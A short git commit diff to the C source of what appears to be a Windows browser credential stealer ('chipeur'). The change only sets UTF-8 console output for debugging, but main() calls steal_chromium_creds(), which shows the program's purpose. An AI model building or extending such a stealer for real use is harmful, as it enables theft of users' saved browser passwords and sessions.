f73fceedb96df4e6f1291b7c0ceb2f3f2499be40
Hilan Meyran <hilanmeyran@protonmail.com>
2024-12-31 22:06:14 +0100

    set terminal to UTF-8 for easier debug

--- src/chipeur.c
+++ src/chipeur.c
@@ -1,13 +1,20 @@
 #include "chipeur.h"
-#include "chromium.h"
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <windows.h>
+
+#include "chromium.h"
 
 void hello(void) { printf("Hello World\n"); }
 
 int main(void) {
+  // Puts the console in UTF-8
+  // Allows us to print non-ASCII characters for debug
+  SetConsoleOutputCP(CP_UTF8);
+
   hello();
   steal_chromium_creds();
+
   return EXIT_SUCCESS;
 }
